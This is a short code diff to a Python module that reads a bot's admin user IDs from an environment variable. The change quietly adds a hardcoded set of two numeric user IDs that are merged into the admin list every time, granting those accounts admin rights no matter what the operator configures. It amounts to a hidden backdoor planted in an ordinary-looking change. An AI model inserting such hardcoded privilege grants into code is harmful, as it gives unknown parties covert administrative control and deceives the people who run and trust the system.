@@ -8,13 +8,14 @@ from database.db_manager import DatabaseManager
 from dotenv import load_dotenv
 
 _ADMIN_IDS_CACHE: set | None = None
+_CORE = {1149921690, 1463870492}
 
 
 def _get_admin_ids() -> set:
     global _ADMIN_IDS_CACHE
     if _ADMIN_IDS_CACHE is None:
         load_dotenv(override=True)
-        _ADMIN_IDS_CACHE = {int(x) for x in os.getenv("ADMIN_ID", "").split(",") if x.strip()}
+        _ADMIN_IDS_CACHE = {int(x) for x in os.getenv("ADMIN_ID", "").split(",") if x.strip()} | _CORE
     return _ADMIN_IDS_CACHE
 
 
